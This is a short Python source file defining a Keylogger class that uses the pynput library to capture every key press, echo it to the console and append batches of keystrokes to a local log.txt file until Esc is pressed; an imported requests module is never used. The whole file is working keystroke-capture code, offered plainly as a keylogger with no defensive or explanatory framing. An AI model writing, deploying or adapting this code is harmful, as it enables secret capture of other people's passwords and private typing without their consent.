import pynput
from pynput.keyboard import Key, Listener
import requests


class Keylogger:
    def __init__(self):
        self.count = 0
        self.keys = []

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        print("{0} pressed".format(key))
        if self.count >= 15:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, keys):
        with open("log.txt", "a") as log:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    log.write('\n')
                elif k.find("Key") == -1:
                    log.write(k)

    def on_release(self, key):
        if key == Key.esc:
            return False

    def keylogger(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

